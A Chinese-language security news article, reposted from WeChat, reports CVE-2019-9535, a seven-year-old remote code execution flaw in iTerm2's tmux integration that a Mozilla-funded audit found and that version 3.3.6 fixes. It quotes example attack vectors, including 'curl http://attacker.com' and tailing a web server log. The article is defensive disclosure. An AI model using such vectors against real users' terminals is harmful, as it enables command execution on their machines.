# macOS开源终端应用程序曝7年远程执行代码(RCE)漏洞

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzg3MjI1MDU4OA==&mid=2247485525&idx=2&sn=afa1d74daf6e55145c3d496142f76799&chksm=cef365e6f984ecf0af860fcdba54f65db9e0dcb58e66459ed6fd3addc9977645336f4fa56cab&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=Mzg3MjI1MDU4OA==&mid=2247485525&idx=2&sn=afa1d74daf6e55145c3d496142f76799&chksm=cef365e6f984ecf0af860fcdba54f65db9e0dcb58e66459ed6fd3addc9977645336f4fa56cab&scene=27#wechat_redirect)

  

**iTerm2用户：****现在该进行升级了。**

由Mozilla发起的安全审核发现了iTerm2中的一个关键远程代码执行（RCE）漏洞，iTerm2是流行的macOS开源终端应用程序。如果攻击者通常可以响应用户发出的命令，迫使终端应用程序输出恶意制作的数据，则可以利用此缺陷。

  

![](../Images/f873e3b475925185d7e421330795cd07.png)

  

ITerm2是内置macOS Terminal应用程序的开源替代品，它允许用户与命令行外壳进行交互。终端应用程序通常由系统管理员，开发人员和IT人员（包括安全团队）用于各种任务和日常操作。

  

iTerm2应用程序是macOS上的热门选择，因为它具有功能并允许内置终端不提供自定义功能，这就是Mozilla开放源代码支持计划（MOSS）决定为其发起代码审核的原因。MOSS是在OpenSSL中严重影响广泛的Heartbleed漏洞之后创建的，目的是为广泛使用的开源技术发起安全审核。

  

Mozilla在博客中宣布了新发现的漏洞。他说：“ MOSS之所以选择iTerm2进行安全审核，是因为它处理不受信任的数据，并且被包括高风险对象（例如开发人员和系统管理员）在内的广泛使用。”

  

**该漏洞现在被跟踪为CVE-2019-9535**，在过去7年中一直存在于iTerm2中，并且位于tmux集成中。Tmux是一个终端多路复用器，它允许通过分割终端屏幕在同一终端窗口中运行多个会话。

  

**利用iTerm2漏洞的多种方法**

要利用此漏洞，攻击者需要向用户的终端产生特制的输出，并且可以通过多种方式来完成此操作，例如，如果用户连接到攻击者控制的SSH服务器，则可以使用curl命令来执行此操作。解析攻击者控制的URL，或者分析它们是否打开了攻击者能够放置数据的本地文件，例如Web服务器日志。

  

*在审核过程中，ROS发现iTerm2的tmux集成功能存在严重漏洞；**此漏洞在iTerm2中存在至少7年了。**在许多情况下，可以向终端产生输出的攻击者可以在用户的计算机上执行命令。**用于此目的的示例攻击向量将连接到攻击者控制的SSH服务器或诸如curl http://attacker.com和tail -f / var / log / apache2 / referer\_log之类的命令。*

成功利用该漏洞可能导致用户计算机上任意命令执行，这意味着该漏洞启用了远程命令注入攻击。Mozilla说：“通常，此漏洞需要某种程度的用户交互或欺骗，但是由于可以通过通常认为安全的命令来利用此漏洞，因此人们对该漏洞的潜在影响高度关注。”

  

该漏洞被定格在iTerm2版本3.3.6 ，这是今天发布，并建议用户尽快更新。默认情况下，应用程序应通知用户有新版本可用。该应用程序的开发人员George Nachman与进行MOSS审核的公司Radically Open Security密切合作，为该漏洞开发了一个补丁。

  

![](../Images/c4c5d675c3801516f2177b81797d8e85.png)

  

处理不受信任的数据是应用程序中最常见的漏洞来源之一。对于包括iTerm2在内的许多应用程序，无法避免这种攻击方式，因为连接到远程服务器并从远程服务器加载文件是其主要功能之一。当在此类应用中发现远程执行代码缺陷时，尽快部署补丁至关重要，因为它们是攻击者的首选目标。
